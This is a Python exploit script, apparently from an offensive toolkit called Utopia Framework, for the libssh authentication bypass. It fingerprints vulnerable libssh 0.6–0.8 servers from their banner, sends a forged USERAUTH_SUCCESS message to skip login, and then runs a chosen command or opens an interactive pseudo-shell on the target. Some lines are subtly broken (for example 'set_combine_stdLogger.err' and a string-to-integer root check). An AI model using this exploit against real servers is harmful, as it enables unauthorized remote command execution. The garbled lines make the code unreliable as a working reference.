#!/usr/bin/env python3

#            ---------------------------------------------------
#                             Utopia Framework                  
#            ---------------------------------------------------
#                  Copyright (C) <2020>  <Entynetproject>       
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import sys
import socket
import time
import argparse
from sys import argv, exit
import paramiko

VERSION = '0.1'

config = {
    'debug' : False,
    'verbose' : False,
    'host' : '',
    'port' : 22,
    'log' : '',
    'connection_timeout' : 5.0,
    'session_timeout' : 10.0,
    'buflen' : 4096,
    'command' : '',
    'shell' : False,
}

class Logger:
    @staticmethod
    def _out(x):
        if config['debug'] or config['verbose']:
            sys.stdout.write(x + '\n')

    @staticmethod
    def dbg(x):
        if config['debug']:
            sys.stdout.write('[dbg] ' + x + '\n')

    @staticmethod
    def general(x):
        Logger._out('\033[1;34m[*]\033[0m ' + x)

    @staticmethod
    def warning(x):
        sys.stdout.write('\033[1;33m[!]\033[0m ' + x + '\n')

    @staticmethod
    def error(x):
        Logger._out('\033[1;31m[-]\033[0m ' + x)

    @staticmethod
    def success(x):
        Logger._out('\033[1;32m[+]\033[0m ' + x)

class UnauthSSH():
    def __init__(self):
        self.host = config['host']
        self.port = config['port']
        self.sock = None
        self.transport = None
        self.connectionInfoOnce = False

    def __del__(self):
        if self.sock:
            self.sock.close()

    def sshAuthBypass(self, force = False):
        if not force and (self.transport and self.transport.is_active()):
            return self.transport

        self.__del__()
        self.sock = socket.socket()

        if not self.connectionInfoOnce:
            self.connectionInfoOnce = True
            Logger.general('Exploiting {}...'.format(
                self.host
            ))
            Logger.general('Establishing connection...')

        try:
            self.sock.connect((str(self.host), int(self.port)))
            
        except Exception as e:
            Logger.error('Failed to exploit {}!'.format(self.host))
            sys.exit()
        
        message = paramiko.message.Message()
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)

        transport = paramiko.transport.Transport(self.sock)
        transport.start_client(timeout = config['connection_timeout'])
        transport._send_message(message)

        self.transport = transport
        return transport

    def NOT_WORKING_shell(self):
        transport = self.sshAuthBypass()
        session = transport.open_session(timeout = config['session_timeout'])
        session.set_combine_stdLogger.err(True)
        session.get_pty()
        session.invoke_shell()

        username = UnauthSSH._send_recv(session, 'username')
        hostname = UnauthSSH._send_recv(session, 'hostname')

        prompt = '{}@{} $ '.format(username, hostname)

        while True:
            inp = input(prompt).strip()

            if inp.lower() in ['exit', 'quit'] or not inp:
                Logger.general('Cleaning up...')
                break

            out = UnauthSSH._send_recv(session, inp)
            if not out:
                Logger.warning('This shell is not stable.')
                return 

            print(out)

    def shell(self):
        self.parashell()

    def parashell(self):
        username = self.execute('whoami')
        hostname = self.execute('hostname')
        userid = self.execute('id -u')

        if userid == 0:
            prompt = '{}@{} #'.format(username, hostname)
        else:
            prompt = '{}@{} $ '.format(username, hostname)
    
        if not username or not hostname:
            Logger.warning('Could not obtain username ({}) and hostname ({}).'.format(username, hostname))
            return

        Logger.general('Opening shell...')
        while True:
            inp = input(prompt).strip()

            if inp.lower() == 'exit':
                break

            out = self.execute(inp)
            if not out:
                return 

            print(out)
            
    @staticmethod
    def _send_recv(session, cmd):
        out = ''
        session.send(cmd.strip() + '\n')

        MAX_TIMEOUT = config['session_timeout']
        timeout = 0.0
        
        while not session.exit_status_ready():
            time.sleep(0.1)
            timeout += 0.1

            if timeout > MAX_TIMEOUT:
                return None
            if session.recv_ready():
                out += session.recv(config['buflen']).decode()

            if session.recv_stderr_ready():
                out += session.recv_stdLogger.err(config['buflen']).decode()

        while session.recv_ready():
            out += session.recv_ready(config['buflen'])

        return out
        
    @staticmethod
    def _exec(session, inp):
        inp = inp.strip()

        session.exec_command(inp + '\n')
        
        retcode = session.recv_exit_status()
        buf = ''

        while session.recv_ready():
            buf += session.recv(config['buflen']).decode()

        buf = buf.strip()
        return buf
    
    def execute(self, cmd, printout = False, tryAgain = False):
        transport = self.sshAuthBypass(force = tryAgain)
        session = transport.open_session(timeout = config['session_timeout'])
        session.set_combine_stderr(True)

        buf = ''
        try:
            buf = UnauthSSH._exec(session, cmd)
        except paramiko.SSHException as e:
            if 'channel closed' in str(e).lower() and not tryAgain:
                return self.execute(cmd, printout, True)

            if printout and not tryAgain:
                print(('{}: {}!'.format(cmd, str(e)))
            return ''

        if printout:
            print('\n{}'.format(buf))

        return buf

def exploit():
    handler = UnauthSSH()
    if config['command']:
        out = handler.execute(config['command'])
        print('\n' + out)
    else:
        handler.shell()

def collectBanner():
    ip = config['host']
    port = config['port']

    try:
        Logger.general('Connecting to {}...'.format(ip))
        s = socket.create_connection((ip, port), timeout = config['connection_timeout'])
        s.settimeout(None)
        banner = s.recv(config['buflen'])
        s.close()
        return banner.split(b"\n")[0]

    except (socket.timeout, socket.error) as e:
        Logger.error('SSH connection timeout!')
        sys.exit()

def check():
    global config
    if not config['command'] and not config['shell']:
        config['verbose'] = True

    banner = collectBanner()  
    
    if banner:
        if any(version in banner for version in [b"libssh-0.6", b"libssh_0.6"]):
            pass

        elif any(version in banner for version in [b"libssh-0.7", b"libssh_0.7"]):
            if int(banner.split(b".")[-1]) >= 6:
                Logger.error('Target is not vulnerable!')
                sys.exit()
            else:
                return True

        elif any(version in banner for version in [b"libssh-0.8", b"libssh_0.8"]):
            if int(banner.split(b".")[-1]) >= 4:
                Logger.error('Target is not vulnerable!')
                sys.exit()
            else:
                return True
        else:
            Logger.error('Target is not vulnerable!')
            sys.exit()
    else:
        Logger.error('Could not obtain SSH service banner!')
        sys.exit()
        
    return False

def parse_opts():
    global config

    parser = argparse.ArgumentParser(description = 'If there was neither shell nor command option specified - exploit will switch to detect mode yielding vulnerable/not vulnerable flag.')
    parser.add_argument('host', help='Hostname/IP address that is running vulnerable SSH server.')
    parser.add_argument('-p', '--port', help='libSSH port', default = 22)
    parser.add_argument('-s', '--shell', help='Exploit the vulnerability and spawn pseudo-shell', action='store_true', default = False)
    parser.add_argument('-c', '--command', help='Execute single command. ', default='')
    parser.add_argument('--logfile', help='Logfile to write paramiko connection logs', default = "")

    parser.add_argument('-v', '--verbose', action='store_true', help='Display verbose output.')
    parser.add_argument('-d', '--debug', action='store_true', help='Display debug output.')

    args = parser.parse_args()

    try:
        config['host'] = args.host
        config['port'] = args.port
        config['log'] = args.logfile
        config['command'] = args.command
        config['shell'] = args.shell
        config['verbose'] = args.verbose
        config['debug'] = args.debug

        if args.shell and args.command:
            Logger.error('Shell and command options are mutually exclusive!')
            sys.exit()

    except:
        parser.print_help()
        return False

    return True

def main():
    if not parse_opts():
        return False

    if config['log']:
        paramiko.util.log_to_file(config['log'])

    check()

    if config['command'] or config['shell']:
        exploit()

if __name__ == '__main__':
    main()
